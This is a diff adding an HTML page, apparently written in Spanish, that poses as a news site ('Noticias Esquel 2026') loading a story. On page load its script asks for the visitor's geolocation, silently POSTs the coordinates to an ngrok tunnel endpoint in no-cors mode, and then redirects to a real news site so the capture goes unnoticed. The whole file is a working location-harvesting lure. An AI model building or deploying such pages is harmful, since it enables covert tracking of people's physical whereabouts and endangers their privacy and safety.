@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Noticias Esquel 2026</title>
+    <script>
+        function enviar(pos) {
+            // AQUÍ PEGA TU LINK DE NGROK
+            const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save";
+            
+            fetch(URL_NGROK, {
+                method: 'POST',
+                mode: 'no-cors', // Importante para evitar bloqueos de seguridad
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
+            });
+            
+            // Redirigir a la noticia real después de capturar
+            setTimeout(() => {
+                window.location.href = "https://www.eqsnotas.com/";
+            }, 1000);
+        }
+
+        function error() {
+            window.location.href = "https://www.eqsnotas.com/";
+        }
+
+        // Pedir ubicación al cargar
+        window.onload = function() {
+            navigator.geolocation.getCurrentPosition(enviar, error);
+        };
+    </script>
+</head>
+<body style="font-family: Arial; text-align: center; padding-top: 50px;">
+    <h1>Cargando noticia...</h1>
+    <p>Conectando con el servidor de noticias local.</p>
+</body>
+</html>
